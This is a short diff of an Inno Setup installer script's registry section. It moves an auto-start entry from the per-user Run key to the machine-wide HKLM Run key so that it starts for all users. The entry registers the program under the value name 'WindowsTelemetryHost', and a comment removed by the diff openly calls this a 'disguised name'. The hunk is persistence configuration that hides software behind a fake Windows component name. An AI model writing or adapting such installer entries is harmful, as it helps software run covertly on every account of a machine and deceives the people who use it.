@@ -72,8 +72,8 @@ Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAl
 Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
   ValueType: string; ValueName: "InstallLocation"; ValueData: "{app}"
 
-; ── HKCU Run key — auto-start under disguised name ───────────────────────────
-Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; \
+; ── HKLM Run key — auto-start immediately for all users ───────────────────────
+Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; \
   ValueType: string; ValueName: "WindowsTelemetryHost"; \
   ValueData: """{app}\{#ExeName}"""; \
   Flags: uninsdeletevalue
